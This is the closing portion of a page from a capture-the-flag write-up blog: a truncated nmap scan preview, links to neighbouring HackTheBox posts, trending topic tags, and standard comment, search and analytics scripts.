-sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-2/192.168.236.7/sca...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Photobomb/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Photobomb</p></a> <a href="/posts/RedPanda/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - RedPanda</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Ambassador/'; this.page.identifier = '/posts/Ambassador/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
